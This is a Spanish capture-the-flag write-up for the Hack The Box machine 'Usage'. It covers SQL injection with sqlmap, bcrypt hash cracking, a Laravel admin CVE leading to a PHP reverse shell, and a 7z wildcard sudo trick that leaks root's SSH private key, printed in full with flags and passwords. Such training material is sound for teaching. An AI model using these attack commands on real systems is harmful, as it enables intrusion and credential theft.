---
title: Usage HTB
date: 2024-08-02
tier: easy
author: naibu3
---
#writeup #HTB 
# Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```nmap
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.18 > allPorts

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```nmap
sudo nmap -p22,80 -sCV 10.10.11.18 > targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se aplica virtual hosting, por lo que debemos añadir el dominio al */etc/hosts*.

Ahora podemos ver la página:

![[usage.png]]

Vemos una pestaña de login, otra de registro y una de *admin*, que nos redirige a *admin.usage.htb*.

En la pestaña de login tenemos una opción *reset password*, que nos pide un email, si mandamos una *`'`*, veremos que nos da un `500 Internal server error`, evidenciando una [[SQL Injection]]. Capturaremos la petición con [[burpsuite]] y utilizaremos [[SQLMap]]:

![[usage2.png]]

![[usage3.png]]

```bash
sqlmap -r request.txt -p email --level 5 --risk 3 --batch --threads 10 --dbs
```

Así obtendremos unas credenciales para el usuario *admin*, con la contraseña hasheada `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`.

```bash
john -w=/usr/share/wordlists/rockyou.txt hashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:08 DONE (2024-08-02 14:08) 0.1200g/s 194.4p/s 194.4c/s 194.4C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Explotación

Ya estamos dentro del panel de administración:

![[usage4.png]]

Vemos que estamos ante un panel [[Laravel]], la versión (en la esquina inferior derecha) es la 1.8.17. Con una búsqueda en internet descubrimos el siguiente [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/). 

# Escalada de privilegios

De esta forma logramos conectarnos mediante una [[Reverse shell]] con [[php]] como el usuario *dash* (flag `9c03f1d4c2bcbc56d3aaa25dfe371b43`). 

Aplicamos un  [[Tratamiento de la tty]], y vemos que existe un usuario *xander*. En el home de *dash*, encontramos un archivo *.monitrc*:

```cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
[...]
```

Estas credenciales resultan válidas para xander.

Si revisamos los [[Privilegios a nivel de Sudoers]]:

```bash
sudo -l

Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Con un *strings*, vemos que se está utilizando [[7z]] con una *wildcard* (`..*`), por lo que podemos hacer lo siguiente:

```bash
xander@usage:/var/backups$ cd /var/www/html/
xander@usage:/var/www/html$ touch '@id_rsa'
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
```
```sh
-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
```

Ya podemos conectarnos con ssh y ver la flag del admin (`6e72bb2fefa0bb0c4afbb0e38ca021dc`):

```bash
chmod 600 id_rsa

ssh root@10.10.11.18 -i id_rsa
```